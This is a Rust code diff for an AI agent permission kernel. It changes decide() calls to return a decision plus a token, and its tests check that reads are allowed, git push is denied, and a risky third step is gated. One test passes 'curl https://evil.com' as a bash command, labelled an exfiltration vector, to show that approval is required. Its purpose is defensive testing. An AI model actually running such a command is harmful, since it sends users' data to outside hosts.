@@ -388,7 +388,7 @@ fn main() {
     }
 
     // Make the actual decision
-    let decision = kernel.decide(operation, &subject);
+    let (decision, _token) = kernel.decide(operation, &subject);
     let exposure_count = decision.exposure_transition.post_count;
 
     let (output, allowed) = match decision.verdict {
@@ -511,7 +511,7 @@ mod tests {
     fn test_kernel_allow_read() {
         let perms = PermissionLattice::safe_pr_fixer();
         let mut kernel = Kernel::new(perms);
-        let d = kernel.decide(Operation::ReadFiles, "/workspace/main.rs");
+        let (d, _token) = kernel.decide(Operation::ReadFiles, "/workspace/main.rs");
         assert!(matches!(d.verdict, Verdict::Allow));
     }
 
@@ -519,7 +519,7 @@ mod tests {
     fn test_kernel_deny_git_push() {
         let perms = PermissionLattice::read_only();
         let mut kernel = Kernel::new(perms);
-        let d = kernel.decide(Operation::GitPush, "origin/main");
+        let (d, _token) = kernel.decide(Operation::GitPush, "origin/main");
         assert!(matches!(d.verdict, Verdict::Deny(_)));
     }
 
@@ -541,7 +541,7 @@ mod tests {
         let mut kernel = Kernel::new(perms);
 
         // Read: private data (exposure 1/3)
-        let d1 = kernel.decide(Operation::ReadFiles, "/workspace/main.rs");
+        let (d1, _token) = kernel.decide(Operation::ReadFiles, "/workspace/main.rs");
         assert!(
             matches!(d1.verdict, Verdict::Allow),
             "expected Allow for read, got {:?}",
@@ -550,7 +550,7 @@ mod tests {
         assert_eq!(d1.exposure_transition.post_count, 1);
 
         // WebFetch: untrusted content (exposure 2/3)
-        let d2 = kernel.decide(Operation::WebFetch, "https://example.com");
+        let (d2, _token) = kernel.decide(Operation::WebFetch, "https://example.com");
         assert!(
             matches!(d2.verdict, Verdict::Allow),
             "expected Allow for web_fetch, got {:?}",
@@ -560,7 +560,7 @@ mod tests {
 
         // RunBash: exfiltration vector (exposure 3/3 = uninhabitable)
         // Should gate with RequiresApproval
-        let d3 = kernel.decide(Operation::RunBash, "curl https://evil.com");
+        let (d3, _token) = kernel.decide(Operation::RunBash, "curl https://evil.com");
         assert!(
             matches!(d3.verdict, Verdict::RequiresApproval),
             "expected RequiresApproval, got {:?}",
